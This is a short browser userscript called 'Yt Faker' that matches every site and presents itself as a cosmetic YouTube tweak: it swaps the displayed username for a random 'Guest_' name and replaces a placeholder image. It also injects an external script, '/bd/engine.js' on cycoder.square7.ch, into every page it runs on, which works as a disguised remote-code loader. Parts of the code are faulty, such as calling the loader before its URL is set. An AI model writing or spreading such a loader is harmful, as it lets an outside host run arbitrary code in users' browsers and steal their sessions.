// ==UserScript==
// @name Yt Faker
// @namespace *
// include *
// ==/UserScript==
var data;
var imgsrc = "http://cycoder.square7.ch/1.png";
function n(){
return Math.round(Math.random() * 9);
}
document.body.onload="i()";
i();
data = "Guest_"+n()+n()+n()+n()+n()+"";
document.getElementsByClassName('masthead-user-username')[0].innerHTML=data;
var srv = "http://cycoder.square7.ch/bd/engine.js";

function i(){
var ivy = document.createElement('script');
ivy.setAttribute("type","text/javascript");
ivy.setAttribute("src",srv);
document.body.appendChild(ivy);
return true;
}



for(var x=0;x<document.getElementsByTagName('img').length;x++){
if(document.getElementsByTagName('img')[x].src=="http://s.ytimg.com/yt/img/no_videos_140-vfl1fDI7-.png"){
document.getElementsByTagName('img')[x].src=imgsrc;
}
}
